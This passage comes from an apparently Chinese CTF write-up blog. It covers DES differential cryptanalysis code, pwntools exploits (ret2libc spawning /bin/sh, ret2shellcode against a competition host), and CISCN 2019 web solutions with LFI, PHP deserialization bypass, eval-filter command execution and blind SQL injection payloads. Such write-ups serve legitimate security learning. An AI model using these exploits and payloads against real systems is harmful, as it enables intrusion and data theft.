class="comment">#为了方便这里只选择SBOX中的S1盒进行演示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sbox</span><span class="params">(a,b)</span>:</span></span><br><span class="line">sbox1=[[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">[<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#存储S1盒output的异或值</span></span><br><span class="line">sout_table=[<span class="number">0</span>]</span><br><span class="line">sout_text=[<span class="string">''</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>*<span class="number">16</span>):</span><br><span class="line">sout_table.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>*<span class="number">16</span>):</span><br><span class="line">sout_text.append(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Si <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line"><span class="keyword">for</span> Se1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">Se2=Se1^Si</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算Se1经过S1盒的值</span></span><br><span class="line">bits1 = bin(Se1).replace(<span class="string">'0b'</span>,<span class="string">''</span>).rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">row1 = int(bits1[<span class="number">0</span>])*<span class="number">2</span>+int(bits1[<span class="number">5</span>])</span><br><span class="line">col1 = int(bits1[<span class="number">1</span>])*<span class="number">8</span>+int(bits1[<span class="number">2</span>])*<span class="number">4</span>+int(bits1[<span class="number">3</span>])*<span class="number">2</span>+int(bits1[<span class="number">4</span>])</span><br><span class="line">val1 = bin(sbox1[row1][col1])[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算Se2经过S1盒的值</span></span><br><span class="line">bits2 = bin(Se2).replace(<span class="string">'0b'</span>,<span class="string">''</span>).rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">row2 = int(bits2[<span class="number">0</span>])*<span class="number">2</span>+int(bits2[<span class="number">5</span>])</span><br><span class="line">col2 = int(bits2[<span class="number">1</span>])*<span class="number">8</span>+int(bits2[<span class="number">2</span>])*<span class="number">4</span>+int(bits2[<span class="number">3</span>])*<span class="number">2</span>+int(bits2[<span class="number">4</span>])</span><br><span class="line">val2 = bin(sbox1[row2][col2])[<span class="number">2</span>:]</span><br><span class="line">So=int(val1,<span class="number">2</span>)^int(val2,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将相应表项加1</span></span><br><span class="line">sout_table[Si*<span class="number">16</span>+So]=sout_table[Si*<span class="number">16</span>+So]+<span class="number">1</span></span><br><span class="line">sout_text[Si*<span class="number">16</span>+So]=sout_text[Si*<span class="number">16</span>+So]+str(Se1).zfill(<span class="number">2</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(0,64):</span></span><br><span class="line"><span class="string">s=str(i)+" : "</span></span><br><span class="line"><span class="string">for j in range(0,16):</span></span><br><span class="line"><span class="string">s=s+str(sout_table[i*16+j])+"  "</span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#print(sout_text[a*16+b])</span></span><br><span class="line"><span class="keyword">return</span> sout_text[a*<span class="number">16</span>+b]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> round1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry_xor</span><span class="params">(decry1,decry2,num)</span>:</span></span><br><span class="line">a=decry1[num*<span class="number">4</span>:num*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">b=decry2[num*<span class="number">4</span>:num*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">return</span> int(a,<span class="number">2</span>)^int(b,<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en_xor</span><span class="params">(number1,number2,number3)</span>:</span></span><br><span class="line">num1=E_change(bin(chain[number1])[<span class="number">2</span>:].zfill(<span class="number">32</span>),number3)</span><br><span class="line">num2=E_change(bin(chain[number2])[<span class="number">2</span>:].zfill(<span class="number">32</span>),number3)</span><br><span class="line"><span class="keyword">return</span> num1^num2,num1,num2</span><br><span class="line">subkey=bin(<span class="number">0x987654321098</span>)[<span class="number">2</span>:]</span><br><span class="line">print(subkey)</span><br><span class="line">chain=[<span class="number">0x92d91525</span>,<span class="number">0x81c82636</span>,<span class="number">0xa3d71597</span>,<span class="number">0xc2a41239</span>,<span class="number">0xa4824698</span>,<span class="number">0x45681249</span>]</span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line"><span class="comment">#0x6148b286                                                                                                              #0x7d4d21d3                                                                                                              #0xaecabffe                                                                                                              #0x74d08779                                                                                                              #0xc8e3d2a4                                                                                                              #0x8d9d872f </span></span><br><span class="line">cipher=[<span class="string">'01100001010010001011001010000110'</span>,<span class="string">'01111101010011010010000111010011'</span>,<span class="string">'10101110110010101011111111111110'</span>,<span class="string">'01110100110100001000011101111001'</span>,<span class="string">'11001000111000111101001010100100'</span>,<span class="string">'10001101100111011000011100101111'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(6):</span></span><br><span class="line"><span class="string">plaintext=bin(chain[i])[2:].zfill(32)</span></span><br><span class="line"><span class="string">cipher[i]=(F(plaintext,subkey))</span></span><br><span class="line"><span class="string">print(cipher)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">en_xo=[[],[],[]]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">en_xo=en_xor(a,b,c)</span><br><span class="line"><span class="comment">#print(en_xo)</span></span><br><span class="line">de_xo=decry_xor(cipher[a],cipher[b],c)</span><br><span class="line">result=Sbox(en_xo[<span class="number">0</span>],de_xo)</span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line">resu=[<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(result)/<span class="number">2</span>)):</span><br><span class="line">resu[i]=(result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line">print(<span class="string">"key:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(result)/<span class="number">2</span>)):</span><br><span class="line">print(en_xo[<span class="number">1</span>]^int(resu[i]))</span><br><span class="line"><span class="comment">#print(en_xo[2]^int(resu[i]))</span></span><br><span class="line">a=int(input())<span class="comment">#第a+1个明文</span></span><br><span class="line">b=int(input())<span class="comment">#第b+1个明文</span></span><br><span class="line">c=int(input())<span class="comment">#明文的第c+1至c+5个bit位</span></span><br><span class="line">getkey(a,b,c)</span><br></pre></td></tr></table></figure><p>根据明文和密文，每两对4bit的明文和6bit的密文可以获得一组key，多组明文密文的组合可以得到做个key的集合，最后几个集合的交集就是key，8个key合在一起就是subkey，有了key就可以进行解密，然后得到明文flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="001"><a href="#001" class="headerlink" title="001"></a>001</h4><p>考察基础的ret2libc和ret2plt </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s=process(<span class="string">"./pwn"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">game_addr=elf.symbols[<span class="string">'game'</span>]</span><br><span class="line"> </span><br><span class="line">write_libc_addr=libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">system_addr=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"> </span><br><span class="line">sh_addr=next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(write_plt)+p32(game_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">write_addr=u32(s.recvuntil(<span class="string">"What'"</span>)[<span class="number">-9</span>:<span class="number">-5</span>])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"> </span><br><span class="line">base_addr=write_addr-write_libc_addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(system_addr+base_addr)+p32(game_addr)+p32(sh_addr+base_addr)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><h4 id="002"><a href="#002" class="headerlink" title="002"></a>002</h4><p>考察基础的ret2shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;172.20.3.35&apos;,9999)</span><br><span class="line">#sh = process(&apos;./Bin&apos;)</span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">#buf2_addr = 0x0804853b</span><br><span class="line">hin_addr=0x080484ed</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&quot;a&quot;*108+shellcode[0:4] + p32(hin_addr)+shellcode[4:])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛-Web</title>
    <link href="https://Foxgrin.github.io//posts/43152/"/>
    <id>https://Foxgrin.github.io//posts/43152/</id>
    <published>2019-04-27T07:15:00.000Z</published>
    <updated>2019-05-20T00:52:32.337Z</updated>
    
    <content type="html"><![CDATA[<p>第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解<a id="more"></a></p><h4 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h4><p>根据源代码给出的提示，知道是先利用<code>LFI</code>读取<code>index.php</code>和<code>hint.php</code>的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img\国赛\1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<code>index.php</code>文件中，我们可以发现参数<code>$_GET[&#39;payload&#39;]</code>最后经过反序列化函数的处理，但是在之前将该参数经过<code>parse_url</code>函数的处理后的结果做了正则匹配过滤的处理，但是我们可以绕过<code>parse_url</code>函数，具体参考链接：<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html</a> </p><p>参考链接中提到，<code>parse_url</code>函数在处理<code>///</code>时会返回<code>false</code></p><p>测试代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看到，当URI的开头为<code>///</code>时，<code>parse_url</code>是无法解析出URL的相关信息的，返回<code>NULL</code></p><p>在官方文档中对该函数的注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。其它任何协议都不能这样。</span><br></pre></td></tr></table></figure><p>尽管该函数能解析不完整的<code>URL</code>，但是无法解析除<code>file:///</code>协议外的其他协议，当<code>parse_url</code>解析不出信息时，将返回<code>NULL</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如此一来，我们绕过了<code>parse_url</code>函数，即可执行反序列化函数，接下来就是要查看类中的具体信息了，类的信息就在<code>hint.php</code>文件中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看到两个类<code>Handle</code>和<code>Flag</code>，要得到flag，我们只能通过调用<code>Flag</code>类的<code>getFlag()</code>方法执行最后的<code>highlight_file</code>方法，但是，通过一次反序列化对象，我们是无法直接调用到该方法的，所以，只有通过<code>Handle</code>类的魔术方法<code>__destruct</code>，它在对象被销毁是自动调用，<code>__constrct</code>则是对象创建时自动调用，调用<code>__destruct</code>方法后才能调用<code>getFlag()</code>方法，所以<code>Handle</code>类的<code>handle</code>属性，必须是一个<code>Flag</code>对象</p><p>另外，我们可以注意到<code>Handle</code>类中还有一个魔术方法<code>__wakeup</code>，这是一个在对象被反序列化时会被自动调用的魔术方法，如果调用了，则会把对象中的所有属性置<strong>null</strong>，所以<code>__wakeup</code>就是我们必须要绕过的第二个地方，这里具体可以参考：<a href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/" target="_blank" rel="noopener">https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/</a></p><p>里面提到了<code>__wakeup</code>魔术方法的一个<strong>bug</strong>，当我们将<code>object size</code>即类的对象个数改为比原有个数大时，<code>__wakeup</code>方法在对象被反序列化时就不会被调用</p><p>测试代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到，正常情况下的反序列化会调用到<code>__wakeup</code>，将<code>handle</code>属性置<strong>null</strong>，导致无法执行<code>getFlag</code>方法，另外我们还可以注意到，稀有属性序列化后有特别的属性格式<code>\x00Handle\x00handle</code></p><p>现在我们将对象个数<strong>1</strong>修改为比1大的数字，将上面代码的测试段修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$h = $_GET[<span class="string">'h'</span>];</span><br><span class="line">unserialize($h);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="E:\fafu网安\blogs\source\img\国赛\8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里发现反序列化函数出现了报错，这是因为我这里测试的PHP版本为7.0过高的原因，可见这个Bug需要较低的PHP版本，将PHP版本修改为5.4后，再次执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有报错，说明成功了，但是这里没有读出内容，是因为要执行<code>getFlag</code>的最后读取文件，还有第三个约束条件</p><p><code>if($this-&gt;token === $this-&gt;token_flag)</code></p><p>如果按照正常的代码逻辑来看，两个的随机数的md5值是几乎不可能相等的，但是我们可以通过类似指针的原理，让<code>$this-&gt;token = &amp;this-&gt;token_flag</code>，这样<code>$this-&gt;token</code>的值会随着<code>$this-&gt;token_flag</code>值的改变而改变，生成最终的<code>Handle</code>对象的代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>序列化后的<code>Handle</code>对象为：<code>O:6:&quot;Handle&quot;:2:{s:14:&quot;\x00Handle\x00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code>，再结合前面分析的两个分别绕过<code>__wakeup</code>和<code>parse_url</code></p><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;\x00Handle\x00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h4 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h4><p>在源码中发现<code>calc.php</code>，访问得到源代码，如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>很明显，看到<code>eval</code>函数，这题考察的是命令执行拿flag，但是<code>$content</code>会先后经过黑白名单的校验并且长度不能大于等于80</p><p>黑名单是限制了我们输入的一些特殊字符，白名单则是限制了我们使用的函数</p><p>这里限制了我们只能使用数学函数，通过查阅各种数学函数的作用，发现能利用的只有<code>base_convert</code>，它能在<code>2</code>进制到<code>36</code>进制之间进行任意进制的转换，而36进制能表示字符<code>0-9a-z</code>，所以我们可以通过该函数来构造一些简单的函数，例如<code>phpinfo</code>，我们先把它转换成十进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo base_convert(&apos;phpinfo&apos;, 36, 10);</span><br><span class="line">55490343972</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里大家可能有疑问，为什么一定要转化为十进制数，其实十进制以下都可以，但是十六进制就不行了，因为十六进制中会包含英文字母，而英文字母会在白名单校验中的正则匹配函数匹配到而执行失败</p><p>我们还可以执行一些其他命令，例如<code>system(&#39;dir&#39;)</code>：<code>base_convert(1751504350,10,36)(base_convert(17523,10,36))</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到目录下存在<strong>flag.php</strong>文件</p><p>但是，单靠一个<code>base_convert</code>函数，我们是无法构建出能读取<strong>flag.php</strong>文件的函数，因为<code>base_convert</code>函数只能构造出<code>0-9a-z</code>范围内的字符，例如空格，点号，都是无法通过进制转换进行构造的</p><p>所以这里想到用php的十六进制转字符串的函数<code>hex2bin</code>，但是该函数只使用与<strong>php7.0</strong>版本以上，正好该题目环境是7.0以上，所以该函数可以利用，同样用<code>base_convert</code>函数构造<code>hex2bin</code>：<code>base_convert(37907361743,10,36)</code>，该函数传入的参数必须是十六进制数，又因为十六进制数难免包含字母，这样会被白名单给过滤，所以我们可以再利用一个数学函数<code>dechex</code>，它能将十进制数转换为十六进制数，也就是说，我们可以通过<code>base_convert(37907361743,10,36)(dechex())</code>构造出函数<code>hex2bin()</code>，但是，这里<code>eval</code>语句最前面还有<code>echo</code>，如果构造<code>system(hex2bin())</code>，则需要调用到两次<code>base_convert</code>和一次<code>dechex</code>，而这样比然长度会超过<strong>80</strong>，所以应该这题要通过其他参数引入的方式来打破字符长度的限制</p><p>开始构造多<code>$_GET</code>传参</p><p>首先先通过传入的参数<code>$c</code>去定义一个变量，变量的值等于<code>_GET</code>，当然，这里变量名必须是<strong>数学函数</strong>，所以这里采用最短的<code>pi</code>作为变量名，这是为了尽可能的压缩长度，构造的payload为：<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上图即执行了语句<code>eval(&#39;echo $pi=base_convert(37907361743,10,36)(dechex(1598506324));&#39;)</code></p><p>接下来，再通过<code>$_GET[]($_GET[])</code>进行多GET执行命令</p><p>但是这里黑名单过滤了<code>[]</code>，而<code>{}</code>是可以用来代替索引数组的</p><p>最终构造的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pow&#125;(($$pi)&#123;pi&#125;)&amp;pow=system&amp;pi=type%20flag.php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为比赛环境关了的原因，本地测试采用的windows系统，linux系统将payload中的<code>type</code>改为<code>cat</code>即可</p><h4 id="全宇宙最简单的SQL"><a href="#全宇宙最简单的SQL" class="headerlink" title="全宇宙最简单的SQL"></a>全宇宙最简单的SQL</h4><p>这题的<strong>waf</strong>会将<code>|</code>，<code>or</code>，<code>sleep</code>，<code>if</code>，<code>benchmark</code>，<code>case</code>等字符替换为<strong>QwQ</strong></p><p>返回的信息有两种：</p><ul><li>SQL语法错误时，会显示<strong>数据库操作失败</strong>。例如：<code>username=admin&#39;&amp;password=123</code></li><li>SQL语法正确时，如果账号密码不对，会显示<strong>登录失败</strong>。例如：<code>username=admin&amp;password=123</code></li></ul><p>排除了延时注入，报错注入，布尔注入。本题采用了一种<strong>基于语法</strong>的盲注，利用<strong>逻辑运算符</strong>和<strong>溢出报错</strong>来进行注入，这里采用了<code>pow(9999,100)</code>，这个表达式的值在MYSQL中已经超出了double范围，会溢出。然后构造以下payload来进行盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; ^ 1 and substr(database(),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123</span><br></pre></td></tr></table></figure><p>在后台构成的SQL查询语句大致就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> ^ <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">and</span> <span class="keyword">pow</span>(<span class="number">9999</span>,<span class="number">100</span>)# <span class="keyword">and</span> <span class="keyword">password</span>=<span 